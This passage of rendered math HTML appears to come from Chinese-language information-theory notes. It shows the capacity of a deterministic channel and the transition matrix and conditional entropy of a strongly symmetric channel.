vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.25em;"><span style="top:-5.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.25em;"><span style="top:-5.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.25em;"><span style="top:-5.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.25em;"><span style="top:-5.25em;"><span class="pstrut" style="height:8em;"></span><span style="width:0.667em;height:6.000em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="6.000em" viewBox="0 0 667 6000"><path d="M347 1759 V0 H0 V84 H263 V1759 v2400 v1759 H0 v84 H347zM347 1759 V0 H263 V1759 v2400 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>这样就有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(Y|X)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，所以</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>C</mi><mo>=</mo><mi>max</mi><mo>⁡</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>log</mi><mo>⁡</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">C=\max H(Y)=\log m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span></span></p><p><strong>强对称：</strong></p><p>对于信道 ${ X,, P\left( Y|X \right) ,,Y } $ ，输入和输出的符号种类数量相同，而且每个符号传递对应传递的概率为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">1-p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>，其他传递错误的可能性平分。每一行和每一列都是 1。也就是如下</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="center" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>X</mi><mo>∈</mo><mrow><mo fence="true">{</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mspace width="1em"/><mi>Y</mi><mo>∈</mo><mrow><mo fence="true">{</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>b</mi><mi>m</mi></msub><mo fence="true">}</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo>−</mo><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo>−</mo><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo>−</mo><mi>p</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow></msub></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{gather*}X\in \left\{ a_1,a_2,.......a_n \right\} ,\quad Y\in \left\{ b_1,b_2,......b_m \right\}\\\left[ \begin{matrix}1-p&amp; \frac{p}{n-1}&amp; .....&amp; \frac{p}{n-1}\\\frac{p}{n-1}&amp; 1-p&amp; ....&amp; \frac{p}{n-1}\\\frac{p}{n-1}&amp; \frac{p}{n-1}&amp; ....&amp; 1-p\\\end{matrix} \right] _{n\times n}\end{gather*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.638em;vertical-align:-2.569em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.069em;"><span style="top:-6.344em;"><span class="pstrut" style="height:4.115em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">.......</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">......</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span><span style="top:-3.569em;"><span class="pstrut" style="height:4.115em;"></span><span class="mord"><span class="minner"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewBox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.115em;"><span style="top:-4.275em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span></span></span><span style="top:-3.0317em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-1.7883em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.615em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.115em;"><span style="top:-4.275em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.0317em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span></span></span><span style="top:-1.7883em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.615em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.115em;"><span style="top:-4.275em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">.....</span></span></span><span style="top:-3.0317em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">....</span></span></span><span style="top:-1.7883em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">....</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.615em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.115em;"><span style="top:-4.275em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.0317em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-1.7883em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.615em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewBox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347zM347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-1.2564em;"><span style="top:-1.0353em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.723em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.569em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>那么很特殊的性质就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(Y|X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span> 是常数，因为每一行信源熵都相等，所以</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><mo stretchy="false">)</mo><mo>+</mo><mrow><mo fence="true">(</mo><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac><mi>log</mi><mo>⁡</mo><mfrac><mi>p</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{j=1}^n{p\left( b_j/a_i \right) \log p\left( b_j/a_i \right)}=(1-p)\log\mathrm{(}1-p)+\left( \frac{p}{n-1}\log \frac{p}{n-1} \right) (n-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0652em;vertical-align:-1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing 